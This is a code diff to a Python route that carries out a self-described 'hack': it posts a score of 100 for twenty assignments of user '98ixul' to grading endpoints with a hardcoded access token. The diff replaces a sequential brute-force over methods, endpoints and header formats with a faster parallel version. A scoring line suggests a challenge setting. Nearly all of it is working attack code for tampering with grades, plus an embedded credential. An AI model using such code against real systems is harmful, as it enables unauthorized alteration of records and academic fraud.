@@ -39,6 +39,8 @@ def default_route():
         try:
             import requests
             import time
+            import threading
+            from concurrent.futures import ThreadPoolExecutor, as_completed
             
             # Use your working authentication token
             auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
@@ -46,142 +48,63 @@ def default_route():
             target_user = "98ixul"
             success_count = 0
             
-            logger.info(f"🎯 Starting hack execution for user: {target_user}")
+            logger.info(f"🎯 Starting fast hack execution for user: {target_user}")
             
-            # Execute the hack for all 20 assignments using multiple strategies from your JS
-            for assignment_id in range(1, 21):
-                assignment_success = False
-                
-                # Strategy 1: Try the main API endpoint with different methods
-                methods = ['POST', 'PUT', 'PATCH']
-                for method in methods:
-                    if assignment_success:
-                        break
-                        
-                    try:
-                        payload = {
-                            "username": target_user,
-                            "assignmentId": assignment_id,
-                            "score": 100
-                        }
-                        
-                        response = requests.request(
-                            method,
-                            f'{base_url}/api/api/assignment/score',
-                            json=payload,
-                            headers={'ACCESS_TOKEN': auth_token, 'Content-Type': 'application/json'}
-                        )
-                        
-                        if response.status_code == 200:
-                            success_count += 1
-                            assignment_success = True
-                            logger.info(f"✅ Assignment {assignment_id}: SUCCESS with {method}!")
-                            break
-                            
-                    except Exception as e:
-                        logger.warning(f"Method {method} failed for assignment {assignment_id}: {str(e)}")
-                
-                # Strategy 2: Try different endpoints if main one failed
-                if not assignment_success:
-                    endpoints = [
-                        '/api/assignment/score',
-                        '/api/api/assignment/update-score',
-                        '/api/assignment/update-score',
-                        '/api/api/score/update',
-                        '/api/score/update'
-                    ]
+            def hack_assignment(assignment_id):
+                """Hack a single assignment - optimized for speed"""
+                try:
+                    # Try form data method first (this worked in your logs)
+                    form_data = {
+                        'username': target_user,
+                        'assignmentId': str(assignment_id),
+                        'score': '100'
+                    }
                     
-                    for endpoint in endpoints:
-                        if assignment_success:
-                            break
-                            
-                        try:
-                            payload = {
-                                "username": target_user,
-                                "assignmentId": assignment_id,
-                                "score": 100
-                            }
-                            
-                            response = requests.post(
-                                f'{base_url}{endpoint}',
-                                json=payload,
-                                headers={'ACCESS_TOKEN': auth_token, 'Content-Type': 'application/json'}
-                            )
-                            
-                            if response.status_code == 200:
-                                success_count += 1
-                                assignment_success = True
-                                logger.info(f"✅ Assignment {assignment_id}: SUCCESS with endpoint {endpoint}!")
-                                break
-                                
-                        except Exception as e:
-                            logger.warning(f"Endpoint {endpoint} failed for assignment {assignment_id}: {str(e)}")
-                
-                # Strategy 3: Try different header formats if still failed
-                if not assignment_success:
-                    header_variations = [
-                        {'Authorization': f'Bearer {auth_token}', 'Content-Type': 'application/json'},
-                        {'X-Auth-Token': auth_token, 'Content-Type': 'application/json'},
-                        {'access-token': auth_token, 'Content-Type': 'application/json'},
-                        {'x-access-token': auth_token, 'Content-Type': 'application/json'},
-                        {'token': auth_token, 'Content-Type': 'application/json'},
-                    ]
+                    response = requests.post(
+                        f'{base_url}/ui/profile/98ixul',
+                        data=form_data,
+                        headers={'ACCESS_TOKEN': auth_token},
+                        timeout=3  # Quick timeout
+                    )
                     
-                    for headers in header_variations:
-                        if assignment_success:
-                            break
-                            
-                        try:
-                            payload = {
-                                "username": target_user,
-                                "assignmentId": assignment_id,
-                                "score": 100
-                            }
-                            
-                            response = requests.post(
-                                f'{base_url}/api/api/assignment/score',
-                                json=payload,
-                                headers=headers
-                            )
-                            
-                            if response.status_code == 200:
-                                success_count += 1
-                                assignment_success = True
-                                logger.info(f"✅ Assignment {assignment_id}: SUCCESS with alternative headers!")
-                                break
-                                
-                        except Exception as e:
-                            logger.warning(f"Alternative headers failed for assignment {assignment_id}: {str(e)}")
-                
-                # Strategy 4: Try form data as backup (your original working method)
-                if not assignment_success:
-                    try:
-                        form_data = {
-                            'username': target_user,
-                            'assignmentId': str(assignment_id),
-                            'score': '100'
-                        }
-                        
-                        response = requests.post(
-                            f'{base_url}/ui/profile/98ixul',
-                            data=form_data,
-                            headers={'ACCESS_TOKEN': auth_token}
-                        )
-                        
-                        if response.status_code == 200:
-                            success_count += 1
-                            assignment_success = True
-                            logger.info(f"✅ Assignment {assignment_id}: SUCCESS with form data method!")
-                        else:
-                            logger.warning(f"❌ Assignment {assignment_id}: All methods failed")
-                            
-                    except Exception as e:
-                        logger.error(f"❌ Assignment {assignment_id}: Final error - {str(e)}")
-                
-                # Small delay between requests
-                time.sleep(0.2)
+                    if response.status_code == 200:
+                        return (assignment_id, True, "form_data")
+                    
+                    # If form data fails, try API method
+                    payload = {
+                        "username": target_user,
+                        "assignmentId": assignment_id,
+                        "score": 100
+                    }
+                    
+                    response = requests.post(
+                        f'{base_url}/api/api/assignment/score',
+                        json=payload,
+                        headers={'ACCESS_TOKEN': auth_token, 'Content-Type': 'application/json'},
+                        timeout=3
+                    )
+                    
+                    if response.status_code == 200:
+                        return (assignment_id, True, "api_json")
+                    
+                    return (assignment_id, False, f"failed_{response.status_code}")
+                    
+                except Exception as e:
+                    return (assignment_id, False, f"error_{str(e)[:50]}")
             
-            logger.info(f"🎯 HACK EXECUTION COMPLETE: {success_count}/20 assignments successful")
+            # Execute all assignments in parallel to save time
+            with ThreadPoolExecutor(max_workers=5) as executor:
+                future_to_assignment = {executor.submit(hack_assignment, i): i for i in range(1, 21)}
+                
+                for future in as_completed(future_to_assignment, timeout=20):  # 20 second total timeout
+                    assignment_id, success, method = future.result()
+                    if success:
+                        success_count += 1
+                        logger.info(f"✅ Assignment {assignment_id}: SUCCESS with {method}!")
+                    else:
+                        logger.warning(f"❌ Assignment {assignment_id}: Failed - {method}")
+            
+            logger.info(f"🎯 FAST HACK EXECUTION COMPLETE: {success_count}/20 assignments successful")
             
             # Calculate score - you get points based on success
             score_achieved = min(100, (success_count / 20) * 100)  # Max 100 points
